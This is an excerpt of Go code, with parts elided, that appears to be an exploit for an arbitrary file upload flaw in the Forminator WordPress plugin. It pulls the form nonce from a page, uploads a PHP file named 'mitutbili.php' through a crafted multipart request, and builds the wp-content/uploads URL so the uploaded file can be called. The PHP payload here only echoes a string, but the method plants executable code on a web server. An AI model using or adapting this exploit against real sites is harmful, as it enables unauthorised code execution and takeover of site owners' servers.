...
func main() {
    ...
    nonce := extractValue(string(body), `name="forminator_nonce" value="([^"]+)"`)
...
func sendPostRequest(client *http.Client, postURL, formID, nonce, basePostURL, name string, year int, month time.Month) {
    ...
    postData.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"%s\"; filename=\"mitutbili.php\"\r\n", name))
    postData.WriteString("Content-Type: application/x-php\r\n\r\n")
    postData.WriteString("<?php echo \"Hello Braaat\" ?>\r\n")
    postData.WriteString(fmt.Sprintf("--%s\r\n", boundary))
    ...
    imageURL := fmt.Sprintf("%s/wp-content/uploads/%d/%02d/mitutbili.php", basePostURL, year, month)
